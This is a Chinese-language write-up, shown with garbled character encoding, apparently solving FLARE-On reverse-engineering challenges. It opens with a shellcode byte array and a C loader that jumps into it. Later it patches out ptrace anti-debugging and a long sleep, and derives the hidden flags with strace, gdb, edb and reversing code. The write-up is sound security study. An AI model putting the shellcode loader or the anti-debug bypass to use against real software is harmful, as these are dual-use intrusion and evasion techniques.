    0xB4, 0x0B, 0xD2, 0xD5, 0x31, 0xE0, 0x72, 0x35, 0x10, 0xD6, 0x40, 0x67, 0xBE, 0x2B, 0xFD, 0x4A,
    0x1C, 0x04, 0x97, 0x3F, 0x3A, 0xFC, 0x79, 0x74, 0x1D, 0x42, 0xB5, 0xB7, 0x2C, 0x0C, 0x0D, 0x13,
    0xF8, 0x25, 0xB0, 0x76, 0x79, 0x4E, 0xB1, 0x7B, 0x66, 0x0C, 0xBB, 0x2D, 0x1C, 0x91, 0x2F, 0xA9,
    0x2C, 0xB8, 0xB0, 0x8D, 0x7E, 0x0D, 0x96, 0x3B, 0xD4, 0x49, 0x6B, 0xD5, 0xB7, 0x03, 0xF7, 0xE1,
    0x7D, 0x46, 0xB9, 0x77, 0x42, 0x3D, 0x1D, 0x11, 0xE0, 0x67, 0x92, 0x4B, 0x85, 0xEB, 0x71, 0x24,
    0x48, 0x9B, 0x02, 0xF9, 0x15, 0x4F, 0xBA, 0x04, 0x00, 0xE3, 0x27, 0x87, 0xD6, 0x9F, 0x70, 0x47,
    0x7A, 0x18, 0xE2, 0x73, 0x1B, 0xFD, 0x74, 0x25, 0x7C, 0x43, 0x90, 0x41, 0xB6, 0x97, 0x99, 0x14,
    0x3C, 0x78, 0x37, 0x83, 0xF8, 0xB3, 0x35, 0x72, 0x3F, 0x69, 0xF5, 0x98, 0xBE, 0x7F, 0x75, 0x4A,
    0x93, 0xB4, 0xA8, 0xB5, 0xBF, 0x21, 0xD0, 0xFC, 0x40, 0x34, 0x7B, 0x05, 0xB2, 0xB2, 0x71, 0x7C,
    0x4E, 0x81, 0xE1, 0x22, 0xEB, 0x04, 0x4A, 0x88, 0xE2, 0x2C, 0x2D, 0x49, 0x42, 0x8D, 0xB3, 0x75,
    0x23, 0xF5, 0x7F, 0x72, 0x0B, 0xFC, 0x97, 0x01, 0xF7, 0xD3, 0xF9, 0x90, 0xBE, 0x41, 0x1C, 0xA8,
    0x25, 0x7D, 0x35, 0xB1, 0x78, 0x79, 0x0A, 0xF8, 0x32, 0xFD, 0x9B, 0x76, 0x1D, 0x92, 0xB4, 0xBB,
    0xB8, 0x77, 0x7E, 0x70, 0x73, 0x40, 0x7A, 0x0C, 0x89, 0xD6, 0x91, 0x24, 0x46, 0x14, 0xBA, 0x9F,
    0x87, 0xC0, 0xD4, 0x0D, 0xB0, 0x4B, 0x2F, 0xB6, 0x81, 0xE3, 0x74, 0x05, 0xB9, 0x3F, 0x67, 0x1B,
    0xD5, 0x93, 0x96, 0x83, 0xE0, 0x66, 0xB5, 0x47, 0xB7, 0x98, 0x3C, 0x15, 0x34, 0xA9, 0x48, 0x37,
    0x27, 0x3D, 0x75, 0x4F, 0xBF, 0x8C, 0xE2, 0x43, 0x99, 0xB8, 0x73, 0x38, 0xEB, 0x7D, 0x7A, 0x25,
    0x85, 0xF9, 0x8D, 0xBB, 0x91, 0x7F, 0x67, 0x96, 0x92, 0xB2, 0x79, 0x48, 0x3C, 0x4A, 0x33, 0xD4,
    0xA9, 0x97, 0x7E, 0x37, 0x47, 0xB3, 0x3D, 0x93, 0x24, 0x05, 0x3F, 0x9F, 0x39, 0xE1, 0x71, 0x35,
    0xB4, 0x23, 0xD6, 0xA8, 0x14, 0x88, 0xD1, 0xF8, 0x72, 0x42, 0xBA, 0x76, 0x08, 0xFD, 0x41, 0xBE,
    0x4B, 0xB5, 0x0D, 0x15, 0x77, 0x43, 0x74, 0x11, 0xE3, 0x78, 0x20, 0xE0, 0x1C, 0x04, 0xBF, 0x40,
    0x10, 0xD5, 0x27, 0xB7, 0xB1, 0x70, 0x2B, 0xF5, 0x2F, 0x22, 0xFC, 0x4E, 0x9B, 0x98, 0x1D, 0x90,
    0x2C, 0xB6, 0x7C, 0x4F, 0x2D, 0x34, 0x66, 0x0C, 0x99, 0xB0, 0x49, 0x7B, 0x7A, 0x78, 0x7E, 0x7F,
    0x73, 0x7D, 0x46, 0xB9, 0x91, 0xB0, 0x8D, 0x92, 0xBF, 0x90, 0xB7, 0x21, 0xF6, 0xE0, 0x4B, 0x13,
    0xF5, 0x29, 0xEB, 0x67, 0x77, 0x25, 0x86, 0xE1, 0x05, 0x2A, 0xD6, 0x66, 0xB9, 0xA8, 0x35, 0x15,
    0x96, 0x42, 0x98, 0x34, 0x99, 0xB1, 0xBA, 0xB4, 0x2C, 0xB5, 0x12, 0xF8, 0x93, 0x4F, 0x76, 0x7B,
    0x79, 0x30, 0xFD, 0xBE, 0x71, 0x3F, 0x40, 0x4E, 0xB3, 0x7C, 0x75, 0x27, 0x09, 0xE2, 0x24, 0x43,
    0x70, 0x0C, 0x2D, 0x18, 0xE3, 0x02, 0xF9, 0x4A, 0x47, 0xBB, 0xB6, 0x41, 0x9F, 0x72, 0x48, 0x97,
    0x80, 0xD4, 0x28, 0xD5, 0x9B, 0x74, 0x3C, 0x1C, 0x84, 0xFC, 0x7D, 0x49, 0xB8, 0x7E, 0x6B, 0xD2,
    0xE0, 0x1D, 0x76, 0x0D, 0x74, 0x31, 0xEB, 0x14, 0x70, 0x37, 0xA9, 0x71, 0x3D, 0x72, 0x46, 0xB2,
    0x78, 0x2F, 0x7F, 0x04, 0xA9, 0xB6, 0x7B, 0x1C, 0x73, 0x3A, 0xE1, 0x3C, 0xBE, 0x19, 0xF9, 0x34,
    0x00, 0xD5, 0x7A, 0x03, 0xF8, 0xE2, 0x24, 0xB0, 0x4E, 0xFD, 0x79, 0x3D, 0x96, 0x75, 0x15, 0x9B,
    0x49, 0x7C, 0x2F, 0xB4, 0x4F, 0x9F, 0x99, 0x47, 0x3B, 0xC1, 0xD0, 0xE3, 0x14, 0x40, 0x3F, 0x90,
    0xBF, 0x41, 0x97, 0x43, 0x8D, 0xB8, 0x48, 0xB5, 0x77, 0x0D, 0xB2, 0x4A, 0x93, 0x2D, 0x67, 0x92,
    0x98, 0xB1, 0x1A, 0xFC, 0xB9, 0xD4, 0x2C, 0xB3, 0xF5, 0xBA, 0x0C, 0x69, 0xD6, 0x91, 0xA8, 0x04,
    0xBB, 0x1D, 0x66, 0x46, 0x05, 0x25, 0xB7, 0x35, 0x42, 0x37, 0x27, 0x4B, 0x90, 0xFC, 0x33, 0xD2,
    0xB2, 0x30, 0x64, 0xFF, 0x32, 0x5A, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28, 0x33,
    0xC9, 0xB1, 0x18, 0x33, 0xFF, 0x33, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF,
    0x0D, 0x03, 0xF8, 0xE2, 0xF0, 0x81, 0xFF, 0x5B, 0xBC, 0x4A, 0x6A, 0x8B, 0x5A, 0x10, 0x8B, 0x12,
    0x75, 0xDA, 0x8B, 0x53, 0x3C, 0x03, 0xD3, 0xFF, 0x72, 0x34, 0x8B, 0x52, 0x78, 0x03, 0xD3, 0x8B,
    0x72, 0x20, 0x03, 0xF3, 0x33, 0xC9, 0x41, 0xAD, 0x03, 0xC3, 0x81, 0x38, 0x47, 0x65, 0x74, 0x50,
    0x75, 0xF4, 0x81, 0x78, 0x04, 0x72, 0x6F, 0x63, 0x41, 0x75, 0xEB, 0x81, 0x78, 0x08, 0x64, 0x64,
    0x72, 0x65, 0x75, 0xE2, 0x49, 0x8B, 0x72, 0x24, 0x03, 0xF3, 0x66, 0x8B, 0x0C, 0x4E, 0x8B, 0x72,
    0x1C, 0x03, 0xF3, 0x8B, 0x14, 0x8E, 0x03, 0xD3, 0x52, 0x33, 0xFF, 0x57, 0x68, 0x61, 0x72, 0x79,
    0x41, 0x68, 0x4C, 0x69, 0x62, 0x72, 0x68, 0x4C, 0x6F, 0x61, 0x64, 0x54, 0x53, 0xFF, 0xD2, 0x68,
    0x33, 0x32, 0x01, 0x01, 0x66, 0x89, 0x7C, 0x24, 0x02, 0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0xFF,
    0xD0, 0x68, 0x6F, 0x78, 0x41, 0x01, 0x8B, 0xDF, 0x88, 0x5C, 0x24, 0x03, 0x68, 0x61, 0x67, 0x65,
    0x42, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x54, 0x50, 0xFF, 0x54, 0x24, 0x2C, 0x57, 0x68, 0x44, 0x21,
    0x21, 0x21, 0x68, 0x4F, 0x57, 0x4E, 0x45, 0x8B, 0xDC, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x14,
    0x24, 0x81, 0x72, 0x0B, 0x16, 0xA3, 0xFB, 0x32, 0x68, 0x79, 0xCE, 0xBE, 0x32, 0x81, 0x72, 0x17,
    0xAE, 0x45, 0xCF, 0x48, 0x68, 0xC1, 0x2B, 0xE1, 0x2B, 0x81, 0x72, 0x23, 0x10, 0x36, 0x9F, 0xD2,
    0x68, 0x71, 0x44, 0xFA, 0xFF, 0x81, 0x72, 0x2F, 0xF7, 0xA9, 0xA9, 0x0C, 0x68, 0x84, 0xE9, 0xCF,
    0x60, 0x81, 0x72, 0x3B, 0xBE, 0x93, 0xA9, 0x43, 0x68, 0xD2, 0xA3, 0x98, 0x37, 0x81, 0x72, 0x47,
    0x82, 0x8A, 0x62, 0x3B, 0x68, 0xEF, 0xA4, 0x11, 0x4B, 0x81, 0x72, 0x53, 0xD6, 0x47, 0xC0, 0xCC,
    0x68, 0xBE, 0x69, 0xA4, 0xFF, 0x81, 0x72, 0x5F, 0xA3, 0xCA, 0x54, 0x31, 0x68, 0xD4, 0xAB, 0x65,
    0x52, 0x8B, 0xCC, 0x57, 0x53, 0x51, 0x57, 0x8B, 0xF1, 0x89, 0xF7, 0x83, 0xC7, 0x1E, 0x39, 0xFE,
    0x7D, 0x0B, 0x81, 0x36, 0x42, 0x45, 0x45, 0x46, 0x83, 0xC6, 0x04, 0xEB, 0xF1, 0xFF, 0xD0, 0x68,
    0x65, 0x73, 0x73, 0x01, 0x8B, 0xDF, 0x88, 0x5C, 0x24, 0x03, 0x68, 0x50, 0x72, 0x6F, 0x63, 0x68,
    0x45, 0x78, 0x69, 0x74, 0x54, 0xFF, 0x74, 0x24, 0x40, 0xFF, 0x54, 0x24, 0x40, 0x57, 0xFF, 0xD0 
};


int main(int argc, const char **argv, const char **envp)
{
    printf("11111111111111111111111");

    __asm
    {
        lea eax, shellcode;
        jmp eax;
    }
    return 0;
}
</code></pre><h2>ç¬¬äº”é¢˜</h2><p>è¿™é“é¢˜çœŸæ˜¯ç™½äº†å°‘å¹´å¤´å•Š...</p><p>æœ€ç»ˆæ˜¯é€šè¿‡flare, comè¿™ä¸¤ä¸ªå…³é”®è¯ç»„æ¨ç†å‡º <code>_cfltcvt_init</code> å‡½æ•°å†…å„ä¸ªå˜é‡ä¹‹é—´çš„å…³ç³»...</p><p>å®é™…ä¸Šç¨å¾®æ³¨æ„ä¸‹å‡½æ•° <code>_cfltcvt_init</code> å†…å„ä¸ªå˜é‡çš„ä½¿ç”¨æƒ…å†µå°±å¯ä»¥å‘ç°, é™¤äº†åˆå§‹åŒ–å„ä¸ªå˜é‡æ—¶éƒ½èµ‹å€¼ä¸€æ¬¡å¤–, æ¯ä¸ªå˜é‡éƒ½æœ‰ä¸¤æ¬¡èµ‹å€¼(å…ˆèµ‹å€¼ä¸º1, åèµ‹å€¼ä¸º0)å’Œä¸€æ¬¡ä¸0æ¯”è¾ƒ. æ¯å½“å˜é‡å€¼å¤§äº0æ—¶, é©¬ä¸Šèµ‹å€¼ä¸º0, å¹¶ä¸”ç»™å¦å¤–ä¸€ä¸ªå˜é‡èµ‹å€¼1, å› æ­¤æ¨æ–­è¿™ä¸ªå˜é‡åº”è¯¥é¦–å…ˆèµ‹å€¼1, ç„¶åä¸0æ¯”è¾ƒ, å¦‚æœå¤§äº0åˆ™è®©ä½ ç­‰äº0, ç„¶åè®©å¦å¤–ä¸€ä¸ªå˜é‡å€¼ä¸º1, å› æ­¤å¯çŒœæµ‹è¿™äº›å˜é‡çš„èµ‹å€¼æ“ä½œæ˜¯æœ‰é¡ºåºçš„, æ¯ä¸€æ¬¡èµ‹å€¼éƒ½æ˜¯è®¾ç½®æ ‡å¿—ä½, æ ‡å¿—ç€ä¸Šä¸€é“æ‰‹ç»­å·²ç»å®Œæˆ, è¯¥è¿›è¡Œä¸‹ä¸€é“æ‰‹ç»­äº†, è€Œå”¯ä¸€è¦åšçš„æ‰‹ç»­å°±æ˜¯æ„é€ å­—ç¬¦ä¸². å› æ­¤, åªè¦æŒ‰ç…§å„ä¸ªå˜é‡çš„èµ‹å€¼é¡ºåºé¡ºè—¤æ‘¸ç“œå³å¯.</p><p>æŒ‰ç…§è¿™ä¸ªç†è®ºå»æ¨ç®— <strong>flare</strong>, <strong>com</strong>, å‘ç°å®Œå…¨ç¬¦åˆ, å¹¶ä¸”æ¨ç®—å‡ºä¸­é—´çš„ç ´æŠ˜å·æ˜¯ <strong>dash</strong>, <strong>on</strong> å­—æ¯è¿˜æ˜¯ <strong>on</strong>, è‹±æ–‡å¥ç‚¹æ˜¯ <strong>dot</strong>, å‰©ä¸‹çš„å°±æ˜¯ä» <code>_cfltcvt_init</code> å‡½æ•°å†…ç¬¬ä¸€ä¸ªå˜é‡å¼€å§‹æ¨ç†äº†, æœ€ç»ˆç»“æœ:</p><pre><code>l0ggingdoturdot5tr0ke5atflaredashondotcom
</code></pre><p>å»æ‰ <strong>dot</strong>, <strong>at</strong>, <strong>dash</strong>, å¾—åˆ°:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5c306c3b3b35323b72292e7269282e6c3739691c3a303d2e39713332723f3331">[email&#160;protected]</a>
</code></pre><p>PS: æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªç®€å•çš„æ–¹æ³•è®©è¿™ä¸ªç¨‹åºè‡ªå·±è¾“å‡ºé‚®ç®±åœ°å€...</p><hr><h2>ç¬¬å…­é¢˜</h2><p>å„ç§å‘, å„ç§æ··æ·†, è¿˜æœ‰åè°ƒè¯•, æŠŠæˆ‘è¿™ä¸ªèœé¸Ÿå¿«å‘æ­»äº†...</p><p>åˆšå¼€å§‹æ—¶å®Œå…¨ä¸çŸ¥é“å¦‚ä½•å…¥æ‰‹, äºæ˜¯è‡ªå·±å†™ <strong>Hello World</strong> æµ‹è¯•, ç¡®å®š <code>main</code> å‡½æ•°ä½ç½®...</p><p>åæ¥å¾—åˆ°å¤§ç‰›æŒ‡å¯¼, æ ¹æ®ç¨‹åºè¾“å‡ºå†…å®¹ç¡®å®š <code>printf</code> å‡½æ•°ä½ç½®å¹¶æ ‡è®°å®ƒ, è€Œä¸”è¿™ä¸ªç¨‹åºä¹Ÿæ˜¯ä¸å‚æ•°æœ‰å…³çš„.</p><p>OK, å¾—åˆ°å¤§ç‰›æŒ‡ç‚¹åå°±æ ‡è®°äº† <code>printf</code> å‡½æ•°, å¹¶ä¸”æµ‹è¯•äº†å½“å‚æ•°ä¸åŒæ—¶ç¨‹åºçš„è¾“å‡ºæœ‰ä»€ä¹ˆä¸åŒ, æµ‹è¯•å‘ç°:</p><ul><li>ä¸€ä¸ªå‚æ•°: è¾“å‡º <strong>no</strong>;</li><li>ä¸¤ä¸ªå‚æ•°: è¾“å‡º <strong>bad</strong>;</li><li>ä¸‰ä¸ªæˆ–ä¸‰ä¸ªä»¥ä¸Šå‚æ•°: è¾“å‡º <strong>stahp</strong></li></ul><p>æ ¹æ®ä»¥ä¸Šä¿¡æ¯å¯æ¨æµ‹ç¨‹åºåº”è¯¥åªæ¥å—ä¸¤ä¸ªå‚æ•°, åé¢çš„åˆ†æä¹Ÿè¯æ˜æ˜¯è¿™æ ·~</p><p>å¦å¤–, åœ¨ä½¿ç”¨ <code>strace</code> å‘½ä»¤æŸ¥çœ‹ç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨æ—¶ä¹Ÿå¯ä»¥å‘ç°, åªè¦å‚æ•°ä¸ªæ•°ä¸æ˜¯ä¸¤ä¸ªçš„æ—¶å€™, ç¨‹åºè¡Œä¸ºä¸æ˜¯å¦è¢« <code>strace</code> ç›‘æ§æ— å…³, ä¸€æ—¦ç¨‹åºæœ‰ä¸¤ä¸ªå‚æ•°æ—¶, è¿™ä¸ªç¨‹åºå°±æœ‰ä¸ªåè°ƒè¯•åˆ¤å®š:</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="14667b7b60547f75787d">[email&#160;protected]</a>:~/Desktop/6# strace -i ./e7bc5d2c0cf4480348f5504196561297 1 1
[    7fc5b45bba87] execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"..., "1", "1"], [/* 30 vars */]) = 0
[          4a9297] uname({sys="Linux", node="kali", ...}) = 0
[          4aa78a] brk(0)               = 0x1441000
[          4aa78a] brk(0x14421c0)       = 0x14421c0
[          45e3f5] arch_prctl(ARCH_SET_FS, 0x1441880) = 0
[          4aa78a] brk(0x14631c0)       = 0x14631c0
[          4aa78a] brk(0x1464000)       = 0x1464000
[          47431b] ptrace(PTRACE_TRACEME, 0, 0x1, 0) = -1 EPERM (Operation not permitted)
[          473e44] fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
[          47509a] mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f04f4220000
[          473f50] write(1, "Program received signal SIGSEGV,"..., 52Program received signal SIGSEGV, Segmentation fault
) = 52
[          473dd8] exit_group(9001)     = ?
</code></pre><p>OK, æ ¹æ®æç¤ºä¿¡æ¯, æ‰¾åˆ°åœ°å€ä¸º <strong>47431b</strong> çš„ä½ç½®, å‘ç°è¿™æ˜¯ä¸€ä¸ªå€¼ä¸º <code>65h</code> çš„ç³»ç»Ÿè°ƒç”¨, æŸ¥çœ‹<a href="http://jianlee.ylinux.org/Computer/Kernel/system_call_list.html">GNU/linuxç³»ç»Ÿè°ƒç”¨åˆ—è¡¨</a> å‘ç°å®ƒæ˜¯ <code>__NR_ioperm: //101è®¾ç½®ç«¯å£I/Oæƒé™</code>, ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨æ­¤å¤„å´å˜æˆäº† <code>__NR_ptrace: // 26è¿›ç¨‹è·Ÿè¸ª</code> è°ƒç”¨äº†, è¯·æ±‚å¤§ç‰›æŒ‡ç‚¹~</p><p>ä¸Šé¢è¿™ä¸ªåœ°æ–¹å°±æ˜¯åè°ƒè¯•çš„åœ°æ–¹äº†, ç›´æ¥å°†è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„åœ°æ–¹ä¿®æ”¹ <code>NOP</code>, ä¹Ÿå°±æ˜¯ <strong>42F211</strong> å¤„çš„ <code>E8 9A 50 05 00</code> äº”ä¸ªå­—èŠ‚å…¨æ”¹ä¸º <code>90</code> å³å¯.</p><p>ç„¶åå°±å¯ä»¥ç”¨ <strong>kali</strong> è‡ªå¸¦çš„ <strong>edb</strong> è°ƒè¯•äº†(ç›¸æ¯” <strong>gdb</strong>, è¿™è´§æ²¡æœ‰ <code>backtrace</code> è¿™æ ·ç‰›é€¼çš„å‘½ä»¤å•Š).</p><p>é€šè¿‡ <strong>bad</strong> å­—ç¬¦ä¸²å¯ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå‚æ•°é•¿åº¦ä¸º 10 ä¸ªå­—èŠ‚, è€Œä¸”æ¯ä¸ªå­—èŠ‚ä¸ <strong>56h</strong> å¼‚æˆ–åç­‰äºå­—ç¬¦ä¸² <strong>bngcg`debd</strong>, å› æ­¤å¯ä»¥åæ¨å‡ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <strong>4815162342</strong>. ä¸‹é¢è¿™æ®µä»£ç æ˜¯å¼‚æˆ–ç¬¬ä¸€ä¸ªå‚æ•°çš„:</p><pre><code>#!bash
.text:0000000000437149 loc_437149:                             ; CODE XREF: sub_435E20+139Fj
.text:0000000000437149                 mov     eax, [rbp+var_C4]
.text:000000000043714F                 cdqe
.text:0000000000437151                 add     rax, [rbp+var_230]
.text:0000000000437158                 mov     edx, [rbp+var_C4]
.text:000000000043715E                 movsxd  rdx, edx
.text:0000000000437161                 add     rdx, [rbp+var_230]
.text:0000000000437168                 movzx   edx, byte ptr [rdx]
.text:000000000043716B                 xor     edx, 56h
.text:000000000043716E                 mov     [rax], dl
.text:0000000000437170                 add     [rbp+var_C4], 1
</code></pre><p>çœ‹çœ‹ç¬¬ä¸€ä¸ªå‚æ•°æ£€æµ‹é€šè¿‡åç¨‹åºåšäº†ä»€ä¹ˆ:</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2c5e4343586c474d4045">[email&#160;protected]</a>:~/Desktop/6# strace -i ./test 4815162342 a
[    7ff6ad0f4a87] execve("./test", ["./test", "4815162342", "a"], [/* 31 vars */]) = 0
[          4a9297] uname({sys="Linux", node="kali", ...}) = 0
[          4aa78a] brk(0)               = 0x10c9000
[          4aa78a] brk(0x10ca1c0)       = 0x10ca1c0
[          45e3f5] arch_prctl(ARCH_SET_FS, 0x10c9880) = 0
[          4aa78a] brk(0x10eb1c0)       = 0x10eb1c0
[          4aa78a] brk(0x10ec000)       = 0x10ec000
[          47c9c0] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[          47c882] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[          473d50] nanosleep({3600, 0}, 
</code></pre><p>ç¨‹åºå¡ä½äº†, <code>sleep</code> 3600ç§’, æŸ¥çœ‹ä¸‹æœ‰ä¸¤å¤„è°ƒç”¨è¿™ä¸ªå‡½æ•°, åˆ†åˆ«è®¾ç½®æ–­ç‚¹, æœ€ç»ˆç¡®è®¤æ˜¯ <strong>473C67</strong> å¤„è°ƒç”¨çš„, å°†å…¶è®¾ç½®ä¸ºç©ºæŒ‡ä»¤~</p><p>å†ä½¿ç”¨ <code>strace</code> è·Ÿè¸ªç¨‹åº, ä»€ä¹ˆéƒ½å‘ç°ä¸äº†äº†...</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="82f0ededf6c2e9e3eeeb">[email&#160;protected]</a>:~/Desktop/6# strace ./test 4815162342  a
[    7fbf6cd9ea87] execve("./test", ["./test", "4815162342", "a"], [/* 30 vars */]) = 0
[          4a9297] uname({sys="Linux", node="kali", ...}) = 0
[          4aa78a] brk(0)               = 0x103c000
[          4aa78a] brk(0x103d1c0)       = 0x103d1c0
[          45e3f5] arch_prctl(ARCH_SET_FS, 0x103c880) = 0
[          4aa78a] brk(0x105e1c0)       = 0x105e1c0
[          4aa78a] brk(0x105f000)       = 0x105f000
[          47c9c0] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[          47c882] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[          47c882] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[          47c882] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[          47c882] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
[          47c882] rt_sigaction(SIGCHLD, NULL, {SIG_DFL, [], 0}, 8) = 0
[          47c9c0] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[    7fffc3975aec] _exit(140736474871580) = ?
</code></pre><p>æ­¤æ—¶, æˆ‘å¿˜è®°ä¹‹å‰æ˜¯å¦‚ä½•å‘ç°å¤„ç†ç¬¬äºŒä¸ªå‚æ•°çš„åœ°æ–¹äº†...ä»”ç»†æƒ³æƒ³, å½“æ—¶åº”è¯¥æ˜¯èŠ±è´¹äº†å¤§é‡æ—¶é—´ç­›é€‰ç¨‹åºç»“æ„, åˆ©ç”¨ç±»ä¼¼äºŒåˆ†æ³•çš„æ–¹å¼æ’é™¤äº†å¤§é‡æ— ç”¨å‡½æ•°åæ‰åˆšå¥½ç¢°åˆ°äº†å¤„ç†ç¬¬äºŒä¸ªå‚æ•°çš„åœ°æ–¹äº†.</p><p>ç°åœ¨é‡æ–°æ¥è¿‡è‚¯å®šä¸èƒ½ç”¨è¿™ä¸ªç¬¨æ–¹æ³•äº†, ä¹‹å‰å¤§ç‰›æåˆ°è¿‡ç»™å‚æ•°ä¸‹è®¿é—®æ–­ç‚¹çš„äº‹æƒ…, å¥½å§, ç»™ç¬¬äºŒä¸ªå‚æ•°ä¸‹è®¿é—®æ–­ç‚¹å§. æ­¤æ—¶å°±ä¸èƒ½ç”¨ <strong>edb</strong> è°ƒè¯•äº†, åªèƒ½ç¥­å‡ºç¥å™¨ <strong>gdb</strong> äº†, åœ¨ <code>main</code> ä¸‹æ–­ç‚¹, ç¡®å®šç¬¬äºŒä¸ªå‚æ•°çš„å†…å­˜åœ°å€, ç„¶åä½¿ç”¨ <code>watch</code> å‘½ä»¤ç»™è¯¥åœ°å€ä¸‹è®¿é—®æ–­ç‚¹, è¿è¡Œç¨‹åº, å½“ç¨‹åºåœä¸‹æ¥æ—¶æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ¡Ÿ:</p><pre><code>#!bash
(gdb) bt
#0  0x00007fffffffd15f in ?? ()
#1  0x00007fffffffd148 in ?? ()
#2  0x000000000044bb2d in ?? ()
#3  0x000000000044c8f1 in ?? ()
#4  0x000000000044eabc in ?? ()
#5  0x000000000045bf71 in ?? ()
#6  0x000000000045dd01 in ?? ()
#7  0x000000000045dea4 in ?? ()
#8  0x0000000000401081 in ?? ()
#9  0x00007fffffffe438 in ?? ()
#10 0x0000000000000000 in ?? ()
</code></pre><p>æ­¤æ—¶æ‰§è¡Œåæ±‡ç¼–å‘½ä»¤ <code>disassemble</code> å¤±è´¥:</p><pre><code>#!bash
(gdb) disassemble 
No function contains program counter for selected frame.
</code></pre><p>é‚£å°±è¿˜æ˜¯åœ¨ <strong>edb</strong> ä¸­è°ƒè¯•å§~~~</p><p>åˆ‡æ¢åˆ° <strong>edb</strong>,æŸ¥çœ‹ <strong>0x44bb2d</strong> å¤„æ±‡ç¼–ä»£ç , åœ¨ <strong>0x44bb2b</strong> å¤„ä¸‹æ–­ç‚¹, ç„¶åè·Ÿè¿›å‡½æ•°è°ƒç”¨å³å¯çœ‹åˆ°ç¬¬äºŒä¸ªå‚æ•°çš„éªŒè¯è¿‡ç¨‹:</p><pre><code>#!bash
.text:000000000044BB13                 lea     rdx, [rbp+var_440]
.text:000000000044BB1A                 mov     rax, [rbp+var_450]
.text:000000000044BB21                 add     rax, 10h
.text:000000000044BB25                 mov     rax, [rax]
.text:000000000044BB28                 mov     rdi, rax
.text:000000000044BB2B                 call    rdx
.text:000000000044BB2D
.text:000000000044BB2D loc_44BB2D:                             ; CODE XREF: sub_44B942+AEj
.text:000000000044BB2D                 mov     [rbp+var_2B], 44h
.text:000000000044BB31                 mov     [rbp+var_25], 44h
.text:000000000044BB35                 cmp     [rbp+var_25], 44h
.text:000000000044BB39                 jz      short loc_44BB6C
</code></pre><p>æœ€ç»ˆå¾—å‡ºç¬¬äºŒä¸ªå‚æ•°æ˜¯ <strong><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="670b56090f061f490f1215134912524906560b27010b0615024a08094904080a">[email&#160;protected]</a></strong>.</p><p>å› æ­¤, è¯¥ç¨‹åºçš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ <strong>4815162342 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="167a27787e776e387e6364623863233877277a56707a7764733b79783875797b">[email&#160;protected]</a></strong></p><h3>é™„å½•:</h3><p>gdbä¸­æŸ¥çœ‹å­—ç¬¦ä¸²:</p><pre><code>#!bash
p  "%s", *(char*)<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5e3f3a3a2c3b2d2d1e323b30">[email&#160;protected]</a>
</code></pre><p>ç”Ÿæˆç¬¬äºŒä¸ªå‚æ•°çš„Cè¯­è¨€ä»£ç (ç¨‹åºä¸­éªŒè¯è¿‡ç¨‹çš„é€†è¿ç®—):</p><p>æ³¨: æ¯ä¸ªå‡½æ•°å¯ç”Ÿæˆ/è¾“å‡ºä¸€ä¸ªå­—æ¯, å‡½æ•°åæ˜¯æµ‹è¯•æ—¶å„ä¸ªè·³è½¬çš„å†…å­˜åœ°å€, ä»…ä¾›å‚è€ƒ.</p><pre><code>#!c
#include &lt;stdio.h&gt;

unsigned char CROL(unsigned char c, int bits)
{
    if (bits &gt; 8)
        bits = bits % 8;


    return (c &lt;&lt; bits) | (c &gt;&gt; (8 - bits));
}

unsigned char CROR(unsigned char c, int bits)
{
    if (bits &gt; 8)
        bits = bits % 8;


    return (c &gt;&gt; bits) | (c &lt;&lt; (8 - bits));
}
unsigned char c = 0;

void e87c()
{
    c = 27;
    c = CROL(c, 0xf2);
    printf("%c", c);
}

void e886()
{
    c = 48;
    c = c ^ 0xb3;
    c = c ^ 0xf2;
